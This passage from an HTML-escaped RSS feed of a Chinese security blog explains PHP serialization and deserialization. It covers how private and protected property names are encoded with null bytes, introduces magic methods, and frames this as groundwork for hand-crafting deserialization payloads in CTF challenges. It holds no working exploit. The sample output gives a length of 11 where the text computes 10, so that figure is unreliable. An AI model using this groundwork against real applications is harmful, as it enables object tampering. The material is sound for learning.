+&lt;/h2&gt;&lt;p&gt;序列化：将PHP对象压缩并按照一定格式转换成字符串过程 serialize()&lt;/p&gt;
+&lt;p&gt;反序列化：从字符串转换回PHP对象的过程 unserialize()&lt;/p&gt;
+&lt;p&gt;目的：为了方便PHP对象的传输和存储&lt;/p&gt;
+&lt;h3 id="序列化实例"&gt;序列化实例
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;test&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="nv"&gt;$flag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Inactive&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;protected&lt;/span&gt; &lt;span class="nv"&gt;$test&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nv"&gt;$test1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;test1&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;set_flag&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$flag&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;flag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$flag&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_flag&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$object&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;set_flag&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Active&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;serialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$object&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id="1-序列化结果分析"&gt;1. 序列化结果分析
+&lt;/h4&gt;&lt;p&gt;当你运行这段代码时，输出的序列化字符串（使用 &lt;code&gt;var_dump&lt;/code&gt; 或 &lt;code&gt;echo&lt;/code&gt;）会是这样的：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;O:4:&amp;#34;test&amp;#34;:3:{s:11:&amp;#34;testflag&amp;#34;;s:6:&amp;#34;Active&amp;#34;;s:7:&amp;#34;*test&amp;#34;;s:4:&amp;#34;test&amp;#34;;s:5:&amp;#34;test1&amp;#34;;s:5:&amp;#34;test1&amp;#34;;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id="2-为什么属性名变长了核心知识点"&gt;2. 为什么属性名变长了？（核心知识点）
+&lt;/h4&gt;&lt;p&gt;在序列化字符串中，非 &lt;code&gt;public&lt;/code&gt; 属性的表示方式是特殊的，因为它们在序列化时会被添加前缀：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;private&lt;/code&gt; 属性&lt;/strong&gt;：前缀是类名。
+&lt;ul&gt;
+&lt;li&gt;原属性名：&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;序列化名：&lt;code&gt;\0类名\0属性名&lt;/code&gt;。例如 &lt;code&gt;\0test\0flag&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;注意&lt;/strong&gt;：这里的 &lt;code&gt;\0&lt;/code&gt; 代表 ASCII 码为 0 的空字符（null byte）。在字符串长度计算中，它占 1 个字符。所以 &lt;code&gt;\0test\0flag&lt;/code&gt; 的长度是 &lt;code&gt;1 + 4 + 1 + 4 = 10&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;protected&lt;/code&gt; 属性&lt;/strong&gt;：前缀是 &lt;code&gt;*&lt;/code&gt;（星号）。
+&lt;ul&gt;
+&lt;li&gt;原属性名：&lt;code&gt;test&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;序列化名：&lt;code&gt;\0*\0属性名&lt;/code&gt;。例如 &lt;code&gt;\0*\0test&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;长度计算：&lt;code&gt;1 + 1 + 1 + 4 = 7&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;public&lt;/code&gt; 属性&lt;/strong&gt;：无前缀。
+&lt;ul&gt;
+&lt;li&gt;原属性名：&lt;code&gt;test1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;序列化名：&lt;code&gt;test1&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="3-这对安全测试意味着什么"&gt;3. 这对安全测试意味着什么？
+&lt;/h4&gt;&lt;p&gt;如果你在进行反序列化漏洞攻击（或解 CTF 题）时，需要手动构造序列化字符串，&lt;strong&gt;必须遵循上述格式&lt;/strong&gt;，否则 &lt;code&gt;unserialize()&lt;/code&gt; 函数将无法正确恢复对象属性。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;手动构造时的陷阱&lt;/strong&gt;：很多人在构造 Payload 时会忘记包含 &lt;code&gt;\0&lt;/code&gt; 空字符，导致反序列化失败，程序报错或返回 &lt;code&gt;false&lt;/code&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;如何生成正确的字符串&lt;/strong&gt;： 为了避免手动计算长度和处理不可见字符带来的错误，建议使用你在练习时编写的 PHP 脚本来生成合法的序列化字符串：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;set_flag&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Active&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nx"&gt;serialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 这样生成的字符串是最准确的
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;： 理解 &lt;code&gt;private&lt;/code&gt; 和 &lt;code&gt;protected&lt;/code&gt; 属性序列化后的这种“带空字节前缀”的特殊格式，是绕过反序列化防御、精准篡改对象属性的关键。&lt;/p&gt;
+&lt;h3 id="魔术方法"&gt;魔术方法
+&lt;/h3&gt;&lt;p&gt;在 PHP 面向对象编程中，&lt;strong&gt;魔术方法（Magic Methods）&lt;/strong&gt; 是一组以双下划线 &lt;code&gt;__&lt;/code&gt; 开头的特殊函数。它们不需要显式调用，而是在特定的&lt;strong&gt;触发时机&lt;/strong&gt;由 PHP 引擎自动调用。&lt;/p&gt;
+&lt;p&gt;魔术方法是 PHP 反序列化漏洞的核心，因为它们为攻击者提供了“自动执行恶意逻辑”的入口。&lt;/p&gt;
+&lt;h4 id="__construct"&gt;__construct
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;A&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="fm"&gt;__construct&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;This is a construct function&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;//...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;A&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;触发时机&lt;/strong&gt;：当你执行 &lt;code&gt;new A()&lt;/code&gt; 时，PHP 引擎会自动寻找类中的 &lt;code&gt;__construct&lt;/code&gt; 方法并立即执行其中的代码。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;应用场景&lt;/strong&gt;：通常用于初始化对象的属性、建立数据库连接或设置默认配置。&lt;/p&gt;
+&lt;h4 id=""&gt;
+&lt;/h4&gt;</description></item><item><title>web（CTFshow知识点)</title><link>https://mawei.org.cn/p/webctfshow%E7%9F%A5%E8%AF%86%E7%82%B9/</link><pubDate>Sun, 26 Apr 2026 00:00:00 +0000</pubDate><guid>https://mawei.org.cn/p/webctfshow%E7%9F%A5%E8%AF%86%E7%82%B9/</guid><description>&lt;h2 id="信息搜集"&gt;信息搜集
 &lt;/h2&gt;&lt;h3 id="web1"&gt;web1
 &lt;/h3&gt;&lt;p&gt;右键打开网页源代码&lt;/p&gt;
 &lt;h3 id="web2"&gt;web2
